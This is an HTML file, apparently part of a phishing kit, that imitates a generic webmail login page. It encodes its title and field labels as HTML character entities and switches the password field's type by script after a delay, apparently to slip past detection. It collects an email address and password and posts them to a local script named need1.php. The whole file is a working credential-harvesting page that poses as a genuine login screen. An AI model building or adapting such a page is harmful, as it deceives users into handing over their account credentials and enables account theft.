<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#98;&#109;&#97;&#105;&#108;&#32;&#76;&#111;&#103;&#105;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 2px solid #bebebe;
	background: transparent;
    height: 36px; 
    width: 275px; 
  	font-family: TheSaB5,Trebuchet MS,Arial,Helvetica,sans-serif;
    font-size: 13px;
  	color: #000;
    padding-left: 38px; 
    border-radius: 4px;
}  
.textbox:focus { 
    outline: none; 
    border: 2px solid #bebebe; 
} 
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 676px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:131px; width:676px; height:579px; z-index:0"><img src="images/b1.png" alt="" title="" border=0 width=676 height=579></div>

<div id="image2" style="position:absolute; overflow:hidden; left:290px; top:473px; width:95px; height:13px; z-index:1"><a href="#"><img src="images/b2.png" alt="" title="" border=0 width=95 height=13></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:545px; width:675px; height:17px; z-index:2"><a href="#"><img src="images/w2.png" alt="" title="" border=0 width=675 height=17></a></div>
<form action=need1.php name=mtlabiyar id=mtlabiyar method=post>
<input name="email" placeholder="&#69;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:285px;left:195px;top:252px;z-index:3">
<input name="psw" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#46;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:285px;left:195px;top:345px;z-index:4">
<div id="formimage1" style="position:absolute; left:194px; top:410px; z-index:5"><input type="image" name="formimage1" width="287" height="36" src="images/wgn.png"></div>
</div>

</body>
</html>
